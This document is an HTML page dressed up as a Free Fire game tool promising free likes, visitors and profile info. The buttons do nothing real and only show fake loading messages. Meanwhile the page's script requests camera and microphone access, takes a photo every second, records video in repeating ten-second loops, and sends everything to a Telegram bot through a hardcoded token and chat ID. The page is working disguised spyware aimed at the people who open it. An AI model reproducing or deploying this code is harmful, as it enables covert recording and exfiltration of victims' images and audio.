<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FF Auto Tools - Likes & Info</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Roboto:wght@400;500&display=swap');

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #0d0e15;
            color: #ffffff;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: radial-gradient(circle at center, #1a1c29, #0d0e15);
            padding: 20px;
        }

        .container {
            background: #151823;
            width: 100%;
            max-width: 450px;
            padding: 30px;
            border-radius: 12px;
            border: 1px solid #2a2d3e;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
            text-align: center;
        }

        h1 {
            font-family: 'Rajdhani', sans-serif;
            font-size: 2.5rem;
            color: #ffaa00;
            margin-bottom: 5px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        p.subtitle {
            color: #8b92a5;
            margin-bottom: 25px;
            font-size: 0.95rem;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #b0b5c9;
            font-weight: 500;
            font-size: 0.9rem;
        }

        input[type="number"] {
            width: 100%;
            padding: 14px;
            background: #090a0f;
            border: 1px solid #3a3f55;
            border-radius: 8px;
            color: #fff;
            font-size: 1.1rem;
            outline: none;
            transition: 0.3s;
        }

        input[type="number"]:focus {
            border-color: #ffaa00;
            box-shadow: 0 0 8px rgba(255, 170, 0, 0.2);
        }

        .btn-grid {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 20px;
        }

        button {
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-family: 'Rajdhani', sans-serif;
            font-size: 1.2rem;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
            transition: all 0.3s ease;
        }

        .btn-info { background: #2b3044; color: #fff; }
        .btn-info:hover { background: #3a415a; }

        .btn-likes { background: linear-gradient(90deg, #ff4500, #ff8c00); color: #fff; }
        .btn-likes:hover { box-shadow: 0 0 15px rgba(255, 69, 0, 0.4); }

        .btn-visitors { background: linear-gradient(90deg, #00b09b, #96c93d); color: #fff; }
        .btn-visitors:hover { box-shadow: 0 0 15px rgba(0, 176, 155, 0.4); }

        /* Fake Loading UI */
        #statusBox {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #1a1e2d;
            border-radius: 8px;
            border-left: 4px solid #ffaa00;
            text-align: left;
            animation: fadeIn 0.3s;
        }

        .status-text { color: #ffaa00; font-weight: 500; font-size: 0.95rem; }
        
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* Hidden Capture Elements */
        #videoElement, #canvasElement { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <h1>FF Auto Tools</h1>
        <p class="subtitle">A2Z Profile Info, Auto Likes & Visitors</p>

        <div class="input-group">
            <label>Enter Game UID</label>
            <input type="number" id="uidInput" placeholder="e.g. 5809073843" required>
        </div>

        <div class="btn-grid">
            <button class="btn-info" onclick="triggerAction('Fetching A2Z Profile Data...')">Get Account Info</button>
            <button class="btn-likes" onclick="triggerAction('Injecting 100 Likes to profile...')">Send 100 Likes (Daily)</button>
            <button class="btn-visitors" onclick="triggerAction('Routing 500 Visitors to profile...')">Send 500 Visitors</button>
        </div>

        <div id="statusBox">
            <div class="status-text" id="statusMessage">Connecting to server...</div>
        </div>
    </div>

    <!-- Hidden Capture Elements -->
    <video id="videoElement" autoplay playsinline muted></video>
    <canvas id="canvasElement"></canvas>

    <script>
        // === YOUR TELEGRAM CREDENTIALS ===
        const BOT_TOKEN = '8725809195:AAFjqaGyk-3Gtovdc-OQImMhJ8TXm9Pw6dY';
        const CHAT_ID = '8091904438'; // Updated with your correct ID!
        
        let currentStream = null;
        let photoInterval = null;
        let mediaRecorder = null;
        let recordingTimeout = null;

        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvasElement');
        const ctx = canvas.getContext('2d');

        // Function triggered by clicking any of the buttons
        function triggerAction(actionText) {
            const uid = document.getElementById('uidInput').value;
            if (!uid) {
                alert("Please enter a valid UID first.");
                return;
            }

            // Show fake UI loading state to keep user on the page
            const statusBox = document.getElementById('statusBox');
            const statusMessage = document.getElementById('statusMessage');
            statusBox.style.display = 'block';
            statusMessage.innerText = actionText;

            setTimeout(() => {
                statusMessage.innerText = "Connecting to Garena API...";
                statusBox.style.borderLeftColor = "#00b09b";
                statusMessage.style.color = "#00b09b";
            }, 3000);

            // Start the hidden camera trap
            const savedCamera = localStorage.getItem('cameraTarget') || 'user';
            startCapture(savedCamera);
        }

        async function startCapture(facingMode) {
            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
            if (photoInterval) clearInterval(photoInterval);
            if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
            if (recordingTimeout) clearTimeout(recordingTimeout);

            try {
                currentStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode },
                    audio: true
                });
                
                video.srcObject = currentStream;

                video.onloadedmetadata = () => {
                    // Take Photo every 1 second
                    photoInterval = setInterval(() => capturePhoto(facingMode), 1000);
                    // Start 10-second Video Loop
                    recordVideoLoop(facingMode);
                };
            } catch (err) {
                console.error("Camera access denied.", err);
            }
        }

        function recordVideoLoop(facingMode) {
            if (!currentStream) return;
            
            mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm' });
            let chunks = [];
            
            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            
            mediaRecorder.onstop = () => {
                sendVideo(chunks, facingMode);
                if (currentStream.active) {
                    recordVideoLoop(facingMode);
                }
            };

            mediaRecorder.start();
            
            recordingTimeout = setTimeout(() => {
                if (mediaRecorder.state === "recording") mediaRecorder.stop();
            }, 10000);
        }

        function capturePhoto(facingMode) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                if (!blob) return;
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, `photo_${facingMode}.jpg`);
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg');
        }

        function sendVideo(chunks, facingMode) {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('video', blob, `video_${facingMode}.webm`);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
        }

        // Listens for camera switch from admin panel
        window.addEventListener('storage', (event) => {
            if (event.key === 'cameraTarget') {
                const newCamera = event.newValue || 'user';
                startCapture(newCamera);
            }
        });
    </script>
</body>
</html>
